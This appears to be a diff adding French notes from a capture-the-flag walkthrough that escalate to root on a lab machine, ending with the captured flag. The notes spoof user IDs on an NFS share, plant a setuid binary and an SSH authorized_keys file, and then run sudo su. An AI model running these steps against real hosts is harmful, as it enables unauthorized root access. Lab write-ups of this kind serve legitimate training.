@@ -1,0 +1,23 @@
+- créer utilisateur local bob avec uid 2020
+- monter le nfs
+- sudo mount -t nfs 192.168.122.26:/home/bob /mnt
+- bob a le droit d'écriture, créer clef ssh, attention permissions /home/bob
+- compiler cuck2.c
+- créer utilisateur local tc avec uid 1001
+- en tant que bob, chmod 777 sur /mnt (/home/bob)
+- en tant que tc local chmod 4777 /mnt/cuck2
+- ssh bob sur la machine, ./cuck2
+- maintenant en tant que tc, cd /home/tc
+- créer .ssh/authorized_keys
+- sudo prend pas en compte le uid, mais pour le fsuid sava
+- ssh tc@host
+- sudo su
+- cat /root/flag OK SAVA
+
+root@box:/home/tc# cat /root/flag 
+Fe©licitations!!!
+
+voici le flag:
+ wsdlkfjvzeffdfsfsdjfjwn
+
+:)
